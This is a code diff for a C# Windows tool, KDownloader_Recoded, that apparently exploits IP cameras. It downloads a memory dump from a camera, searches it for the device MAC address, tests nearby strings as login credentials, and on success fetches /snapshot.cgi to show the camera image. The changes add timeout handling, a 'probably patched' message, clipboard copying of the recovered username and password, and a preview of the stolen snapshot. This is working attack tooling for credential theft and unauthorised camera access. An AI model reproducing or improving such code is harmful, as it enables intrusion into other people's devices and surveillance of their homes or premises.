@@ -84,11 +84,10 @@ namespace KDownloader_Recoded
 
         public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
         {
-            failsafeTimer.Stop();
-            failsafeTimer.Start();
-
             this.BeginInvoke((MethodInvoker)delegate {
 
+                failsafeTimer.Stop();
+                failsafeTimer.Start();
                 print(Color.Black, "Downloading data: " + e.BytesReceived / 1024 + "KB");
 
                 if(e.BytesReceived > 4500000)
@@ -100,6 +99,7 @@ namespace KDownloader_Recoded
         }
         public void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
         {
+            failsafeTimer.Stop();
             print(Color.DarkGreen, "Downloading data: Done");
             scanMemData();
         }
@@ -133,9 +133,11 @@ namespace KDownloader_Recoded
             List<String> possibleMacAddress = new List<String> { };
 
             bool found = false;
+            bool hasData = false;
 
             foreach(string s in rawSplit)
             {
+                hasData = true;
                 if(s == macAddr)
                 {
                     print(Color.Green, "MAC Found - Testing possible creds");
@@ -177,9 +179,13 @@ namespace KDownloader_Recoded
                 extCount++;
             }
 
-            if (!found)
+            if (!hasData)
             {
-                print(Color.Red, "Nothing found. Probably patched.");
+                print(Color.Red, "No data. Probably patched.");
+            }
+            if (!found && hasData)
+            {
+                print(Color.Red, "Search failed. Press [M] to find manually.");
             }
 
         }
@@ -223,7 +229,14 @@ namespace KDownloader_Recoded
            colourItem item = lb_console.Items[e.Index] as colourItem;
            if (item != null)
            {
-               e.Graphics.DrawString(item.Message, lb_console.Font, new SolidBrush(item.ItemColor), 0, e.Index * lb_console.ItemHeight);
+                Bitmap tmbmp = new Bitmap(1, 1);
+                Graphics g = Graphics.FromImage(tmbmp);
+
+                int width = (int)g.MeasureString(item.Message, lb_console.Font).Width;
+                e.Graphics.DrawString(item.Message, lb_console.Font, new SolidBrush(item.ItemColor), ((lb_console.Width / 2) - (width / 2)), e.Index * lb_console.ItemHeight);
+
+                g.Dispose();
+                tmbmp.Dispose();
            }
            else
            {
@@ -257,7 +270,8 @@ namespace KDownloader_Recoded
             w.Credentials = new NetworkCredential(user, pass);
             try
             {
-                w.DownloadData(ipAddr + "/snapshot.cgi");
+                byte[] dldata = w.DownloadData(ipAddr + "/snapshot.cgi");
+                setExImg(dldata);
                 return true;
             }
             catch
@@ -270,7 +284,7 @@ namespace KDownloader_Recoded
         {
             if(e.KeyChar == 'm')
             {
-                if(rawSplit.Length != 0 && rawSplit != null)
+                if(rawSplit != null && rawSplit.Length != 0)
                 {
                     List<String> strDump = new List<String> { };
                     if((rawSplit.Length - extCount) > 15)
@@ -296,6 +310,27 @@ namespace KDownloader_Recoded
                     }
                 }
             }
+            if(e.KeyChar == 'u')
+            {
+                if(username != "")
+                {
+                    Clipboard.SetText(username);
+                }
+            }
+            if(e.KeyChar == 'p')
+            {
+                if(password != "")
+                {
+                    Clipboard.SetText(password);
+                }
+            }
+        }
+
+        public void setExImg(byte[] dldata)
+        {
+            Bitmap bmp;
+            using (var ms = new MemoryStream(dldata)){ bmp = new Bitmap(ms); }
+            successPB.Image = bmp;
         }
 
         private void btn_cut_Click(object sender, EventArgs e)
@@ -309,6 +344,7 @@ namespace KDownloader_Recoded
             //if no data is recieved for 5 seconds, we assume the camera has died and end the download process
             print(Color.Orange, "Download was closed early.");
             w.CancelAsync();
+            failsafeTimer.Stop();
         }
     }
 }
